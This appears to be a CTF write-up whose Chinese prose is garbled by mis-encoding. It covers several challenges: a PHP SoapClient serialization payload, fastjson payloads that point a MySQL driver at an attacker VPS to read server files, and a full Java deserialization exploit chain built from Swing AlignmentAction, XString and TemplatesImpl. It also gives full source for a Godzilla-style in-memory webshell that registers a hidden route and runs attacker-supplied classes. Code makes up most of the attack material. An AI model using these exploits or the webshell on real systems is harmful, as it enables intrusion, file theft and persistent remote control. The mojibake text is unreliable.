\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\r\\n--0f9486e921f5468f9ab50745c4c93267--\\r\\n&quot;;try &#123; $a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;, &#x27;user_agent&#x27; =&gt; &quot;shanghe\\r\\n&quot; . &quot;Cookie: PHPSESSION=16aaab9fb\\r\\nContent-Type: multipart/form-data; boundary=&quot;.substr($postdata,2,32).&quot;\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\nContent-Length: 10416&quot;.&quot;\\r\\n\\r\\n&quot;.$postdata, &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;));&#125; catch (SoapFault $e) &#123;&#125;$b = new siroha();$b-&gt;koi=[&quot;zhanjiangdiyishenqing&quot;=&gt;[$a,&quot;nnnnn&quot;]];echo urlencode(serialize($b)); è¿™ nm çœŸæŠ½è±¡ï¼ŒğŸ‘´æå‡ºæ¥ï¼Œè‡ªå·±éƒ½ç»·ä¸ä½äº†. ä½†æ˜¯ğŸ‘´æ‰“è¿›å»ï¼Œæ–‡ä»¶è¢«æ›¿æ¢ï¼Œé‚£ç§ç»ˆå‡ºçš„æ„Ÿè§‰ï¼ŒçœŸâˆšâ‘§çˆ½ï¼ï¼ï¼1 Ezfastjson shanhegiegie å‡ºçš„é»‘ç›’ (å¤§æ¦‚) java, åˆšå¥½å†…å®¹æ˜¯æˆ‘å­¦è¿‡çš„ï¼Œæˆ‘å¯å¤ªå–œæ¬¢äº†ğŸ¥°ğŸ¥°ğŸ¥µ æœ¬åœ°èµ·ä¸ª msql_fake_server 1&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125; è¯»å•¥æ–‡ä»¶éƒ½è¡Œï¼Œé™¤äº† flag, 1&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125; æºç é‰´èµä¸€æ³¢ ä½ â›°ğŸgiegie è„‘æŠ½äº† æŠŠ waf å†™åœ¨äº† parseObject ä¹‹åï¼Œé‚£ä¸ç›´æ¥æ‰“å®Œååºåˆ—åŒ–æ¼æ´å†æ£€æµ‹å—ï¼Œè·Ÿæ²¡æœ‰ä¸€æ ·. æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“ JNDI, ä¸è¿‡è¿™ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯é¢„æœŸè§£ï¼Œé¢„æœŸè§£çš„é“¾å­æ¯”è¾ƒæœ‰æ„æ€. è¿™æ˜¯é»‘åå•ï¼ŒåŸºæœ¬ä¸Šæ˜¯æŠŠ readobject åˆ° tostring ç»™ ban äº†. ä¸è¿‡è¿˜æœ‰æœ€ç»ˆæ­¦å™¨ï¼ŒğŸ‘´é©¬ä¸Šå°±æå‡ºæ¥ç»™ä½ çœ‹çœ‹ï¼ï¼ï¼ å°±æ˜¯ NEEPUCTF ä¸­ Nomap çš„é‚£æ¡é“¾. Nomap è°ƒç”¨é“¾ 1234javax.swing.AbstractAction#readObject -&gt; javax.swing.AbstractAction#putValue -&gt; javax.swing.AbstractAction#firePropertyChange -&gt; java.lang.Object#equals è¿™ beyondÃ· ç©æ„éœ€è¦é‡å†™ writeObject, é‚£ä¹ˆæ”¹ writeObject æ–¹æ³•æ¯”è¾ƒå¤šï¼Œä½†æ˜¯ javassist è²Œä¼¼ç”¨ä¸äº†ï¼Œéœ€è¦ä½¿ç”¨ agent å»ä¿®æ”¹. è°éƒ½æ²¡æœ‰æƒ³åˆ°ï¼Œæˆ‘ä»¬è‡³å°Šçš„å¤§ B è€å¸ˆä½¿ç”¨æœ¬åœ°é‡æ–°å†™ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç±»å»ä¿®æ”¹ï¼Œyahari, é«˜ç«¯çš„æ–¹æ³•å¾€å¾€åªéœ€è¦æœ´ç´ çš„æ“ä½œ.ğŸ¤£ çœ‹çœ‹ javax.swing.AbstractAction#readObject å‚è€ƒæ–‡çŒ®ğŸ˜Š ä¸€æ¡æŠ½è±¡çš„ equals è§¦å‘é“¾ | Prove yourself (aecous.github.io) [NeepuCTF2023 å…¬å¼€èµ› Writeup - Boogiepop Doesnâ€™t Laugh (boogipop.com)](https://boogipop.com/2023/05/21/NeepuCTF2023 å…¬å¼€èµ› Writeup/) ğŸ‘´æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ è°ƒç”¨é“¾ 1234javax.swing.AbstractAction#readObject -&gt; javax.swing.AbstractAction#putValue -&gt; javax.swing.AbstractAction#firePropertyChange -&gt; java.lang.Object#equals è¿™ beyondÃ· ç©æ„éœ€è¦é‡å†™ writeObject, é‚£ä¹ˆæ”¹ writeObject æ–¹æ³•æ¯”è¾ƒå¤šï¼Œä½†æ˜¯ javassist è²Œä¼¼ç”¨ä¸äº†ï¼Œéœ€è¦ä½¿ç”¨ agent å»ä¿®æ”¹. è°éƒ½æ²¡æœ‰æƒ³åˆ°ï¼Œæˆ‘ä»¬è‡³å°Šçš„å¤§ B è€å¸ˆä½¿ç”¨æœ¬åœ°é‡æ–°å†™ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç±»å»ä¿®æ”¹ï¼Œyahari, é«˜ç«¯çš„æ–¹æ³•å¾€å¾€åªéœ€è¦æœ´ç´ çš„æ“ä½œ.ğŸ¤£ çœ‹çœ‹ javax.swing.AbstractAction#readObject å†çœ‹çœ‹ javax.swing.AbstractAction#putValue è§¦å‘ equals,equals å¯ä»¥è§¦å‘ Xstring çš„ equals ä»è€Œè°ƒç”¨ä»»æ„ getters. ç”±äºæ˜¯æŠ½è±¡ç±»ï¼Œéœ€è¦æ‰¾åˆ°å…¶å­ç±» é€‰æ‹© AlignmentAction. writeObject AlignmentAction åœ¨è¿›è¡Œæ„é€ å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šä¸æ–­å‘ä¸Šå»è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³• Action.NAME ä¸ºå›ºå®šçš„ Nameï¼Œname ä¸ºæˆ‘ä»¬çš„ç¬¬ä¸€å‚æ•° è·Ÿè¿› putValue åˆ›å»ºäº† arrayTable , æŠŠ Name å’Œ value æ”¾å…¥. ä½¿ç”¨ alignmentAction.putValue ï¼Œå°†æ¶æ„é”®å€¼ä¹Ÿæ·»åŠ è¿› arrayTable ä¸­. éšå writeObject å†™å…¥åºåˆ—åŒ–æµ å°†é”®å€¼å¯¹ä¸€æ¬¡æŒ‰é˜Ÿå†™å…¥ readObject ä¼šè¯»å–é”®å€¼å¯¹ï¼Œç„¶åå’Œä¹‹å‰ä¸€æ ·ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ ArrayTable å¹¶ä¸”æ”¾å…¥é”®å€¼å¯¹. ä½†æ˜¯å¦‚æœä¸€å¯¹é”®å€¼å¯¹çš„ key ä¹‹å‰å·²ç»å­˜å…¥äº†è¯¥ key, é‚£ä¹ˆå°±ä¼šå°†è¯¥å€¼èµ‹å€¼ç»™ oldValue, ç„¶åè°ƒç”¨ firePropertyChange . è¿™é‡Œè®© oldValue ä¸º Xstring , newValue ä¸º jsonnodes å³å¯. è¦å®Œæˆè¿™ä¸ªæ­¥éª¤ï¼Œéœ€è¦è®© jsonnodes çš„ key å’Œ Xstring çš„ key ä¸€è‡´. å¯¹æ­¤ Aecous ä½¬ç»™å‡ºçš„æ–¹æ³•ç®€å•ç²—æš´ï¼Œç›´æ¥ç”¨ 010 æ”¹æ–‡ä»¶çš„åºåˆ—åŒ–æ•°æ® å¤§ B è€å¸ˆé‡å†™ wtireArrayTable æ–¹æ³• 123456789101112131415static void writeArrayTable(ObjectOutputStream s, ArrayTable table) throws IOException &#123; if (table != null &amp;&amp; table.getKeys((Object[])null) != null) &#123; int validCount = false; s.writeInt(3); s.writeObject(&quot;Name&quot;); s.writeObject(&quot;111&quot;); s.writeObject(&quot;key1&quot;); s.writeObject(table.get(&quot;key1&quot;)); s.writeObject(&quot;key1&quot;); s.writeObject(table.get(&quot;key2&quot;)); &#125; else &#123; s.writeInt(0); &#125; &#125; ä¸è¿‡è¿™ä¸ªæ–¹æ³•æˆ‘æ²¡æ‰“æˆåŠŸ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import com.alibaba.fastjson.JSONArray;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.http.HttpEntity;import org.springframework.http.HttpHeaders;import org.springframework.http.ResponseEntity;import org.springframework.web.client.RestTemplate;import javax.management.BadAttributeValueExpException;import javax.swing.event.SwingPropertyChangeSupport;import javax.swing.text.StyledEditorKit;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.net.URI;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;public class exp2 &#123; public static void main(String[] args) throws Exception &#123; byte[] code= Files.readAllBytes(Paths.get(&quot;D:\\\\java\\\\bypassjava\\\\META-INF\\\\maven\\\\com.example\\\\bypassJava\\\\target\\\\classes\\\\gsl.class&quot;)); byte[][] codes=&#123;code&#125;; TemplatesImpl templatesImpl = new TemplatesImpl(); try &#123; setFieldValue(templatesImpl, &quot;_bytecodes&quot;, codes); setFieldValue(templatesImpl, &quot;_name&quot;, &quot;1llustrious&quot;); setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl()); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;); Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templatesImpl); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);// POJONode jsonNodes2 = new POJONode(templatesImpl);// BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);// Field val2 = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);// val2.setAccessible(true);// val2.set(exp2,jsonNodes2);// KeyPairGenerator keyPairGenerator;// keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);// keyPairGenerator.initialize(1024);// KeyPair keyPair = keyPairGenerator.genKeyPair();// PrivateKey privateKey = keyPair.getPrivate();// Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);// SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);// POJONode jsonNodes = new POJONode(signedObject); JSONArray jsonArray = new JSONArray(); jsonArray.add(proxyObj); XString xString = new XString(&quot;111&quot;); SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(&quot;11&quot;); StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction(&quot;111&quot;,1); Field field = Class.forName(&quot;javax.swing.AbstractAction&quot;).getDeclaredField(&quot;changeSupport&quot;); field.setAccessible(true); field.set(alignmentAction,swingPropertyChangeSupport); alignmentAction.putValue(&quot;key1&quot;,xString); alignmentAction.putValue(&quot;key2&quot;,jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);// objectOutputStream.writeUTF(&quot;NEEPU&quot;);// objectOutputStream.writeInt(1949); objectOutputStream.writeObject(alignmentAction); FileOutputStream fout=new FileOutputStream(&quot;1.ser&quot;); fout.write(barr.toByteArray()); fout.close();// try &#123;// unserialize(&quot;1.ser&quot;);// &#125; catch (Exception e) &#123;// throw new RuntimeException(e);// &#125; //System.out.println(serial(exp)); //deserial(serial(map)); //doPOST(exp.toString().getBytes());// FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;); //System.out.println(serial(exp)); //deserial(serial(map)); //doPOST(exp.toString().getBytes());// byte[] byt=new byte[fileInputStream.available()];// fileInputStream.read(byt);// doPOST(byt); &#125; private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123; Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); &#125; public static Object unserialize(String filename) throws Exception &#123; ObjectInputStream ois=new ObjectInputStream(Files.newInputStream(Paths.get(filename))); Object obj=ois.readObject(); return obj; &#125; public static void doPOST(byte[] obj) throws Exception&#123; HttpHeaders requestHeaders = new HttpHeaders(); requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);// URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;); URI url = new URI(&quot;http://localhost:8090/nomap&quot;); //URI url = new URI(&quot;http://localhost:8080/bypassit&quot;); HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class); System.out.println(res.getBody()); &#125;&#125; å†…å­˜é©¬ ç½‘ä¸Šæœ‰å¾ˆå¤šå†…å­˜é©¬çš„å†™æ³•ï¼Œä¸è¿‡æˆ‘æ•´ä¸ªæœ‰æ„æ€çš„. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class gsl extends AbstractTranslet &#123; public static Map&lt;String, Object&gt; store = new HashMap&lt;&gt;(); public static String xc=&quot;3c6e0b8a9c15224a&quot;; public static String pass=&quot;pass&quot;,md5; public static byte[] x(byte[] s, boolean m) &#123; try &#123; javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;); c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;)); return c.doFinal(s); &#125; catch (Exception e) &#123; return null; &#125; &#125; public static String md5(String s) &#123; String ret = null; try &#123; java.security.MessageDigest m; m = java.security.MessageDigest.getInstance(&quot;MD5&quot;); m.update(s.getBytes(), 0, s.length()); ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase(); &#125; catch (Exception e) &#123; &#125; return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123; Class base64; String value = null; try &#123; base64 = Class.forName(&quot;java.util.Base64&quot;); Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null); value = (String) Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e) &#123; try &#123; base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e2) &#123; &#125; &#125; return value; &#125; private static Class defineClass(byte[] classbytes) throws Exception &#123; URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); method.setAccessible(true); return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length); &#125; public static byte[] base64Decode(String bs) throws Exception &#123; Class base64; byte[] value = null; try &#123; base64 = Class.forName(&quot;java.util.Base64&quot;); Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e) &#123; try &#123; base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e2) &#123; &#125; &#125; return value; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; md5 = md5(pass + xc); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = gsl.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); gsl readfile_inject = new gsl(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws Exception &#123; byte[] data=base64Decode(request.getParameter(pass)); data=x(data, false); try&#123; HttpSession session = request.getSession(); if (session.getAttribute(&quot;payload&quot;)==null)&#123; session.setAttribute(&quot;payload&quot;,defineClass(data)); &#125;else &#123; request.setAttribute(&quot;parameters&quot;,data); java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream(); Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance(); f.equals(arrOut); f.equals(request); response.getWriter().write(md5.substring(0,16)); f.toString(); response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true))); response.getWriter().write(md5.substring(16));&#125; &#125; 